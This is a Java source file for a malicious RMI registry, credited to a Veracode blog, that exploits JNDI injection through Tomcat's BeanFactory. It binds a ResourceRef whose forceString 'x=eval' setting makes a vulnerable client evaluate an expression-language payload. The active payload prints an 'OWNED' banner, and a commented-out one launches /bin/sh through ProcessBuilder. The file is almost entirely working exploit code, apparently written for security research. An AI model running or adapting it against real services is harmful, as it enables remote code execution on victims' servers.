import java.rmi.registry.*;

import com.sun.jndi.rmi.registry.*;

import javax.naming.*;

import org.apache.naming.ResourceRef;

//Credit: https://www.veracode.com/blog/research/exploiting-jndi-injections-java

 

public class EvilRMIServerNew {

    public static void main(String[] args) throws Exception {

        System.out.println("Creating evil RMI registry on port 1097");

        Registry registry = LocateRegistry.createRegistry(1097);

 

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory

        //ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //ResourceRef ref = new ResourceRef("ResourceBeanTest", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);

        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code

        //ref.add(new StringRefAddr("forceString", "foo=doVeryBadStuff"));
        ref.add(new StringRefAddr("forceString", "x=eval"));

        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows

        // Doesn't seem to actually run the command
        //ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','touch pwned']).start()\")"));
        
        //works
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"java.lang.System\").getDeclaredField(\"out\").get(\"\".getClass().forName(\"java.lang.System\")).println(\"-------OWNED------\")"));

        //ref.add(new StringRefAddr("foo", "this is foo string"));
 

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);

        registry.bind("Object", referenceWrapper);

    }

}

 
